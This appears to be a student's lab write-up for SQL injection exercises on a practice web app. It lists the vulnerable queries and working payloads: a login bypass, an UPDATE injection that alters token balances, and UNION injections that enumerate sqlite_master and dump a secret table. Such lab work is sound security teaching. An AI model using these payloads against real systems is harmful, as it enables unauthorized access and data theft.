# Third Laboratory (SQLi) Scripts

### Admin Login Credentials:

Query Executed:
```sql
SELECT id, username, password, bio, age, jackpot_val FROM user WHERE username = '_' AND password = '_'
```

Password to Log Into Any Account:
```sql
' OR ''='
```

---

### Get More Tokens through Update Profile:

Query Executed:
```sql
UPDATE user SET bio = '_' WHERE username = '_'
```

Bio to Change Account Tokens:
```sql
', tokens = '_
```

---

### View Secret Blogpost through Search:

Query Executed:
```sql
SELECT id, title, content FROM blog_post WHERE title LIKE '%_%' OR content LIKE '%_%'
```

Search to Find Secret Blogpost Table:
```sql
' UNION SELECT NULL, tbl_name, sql FROM sqlite_master --
```

Search to View Secret Blogpost:
```sql
' UNION SELECT id, title, content FROM secret_blog_post --
```

---

### Get s(..) Table Content:
- [Python Script](./BlindSQLi.py)
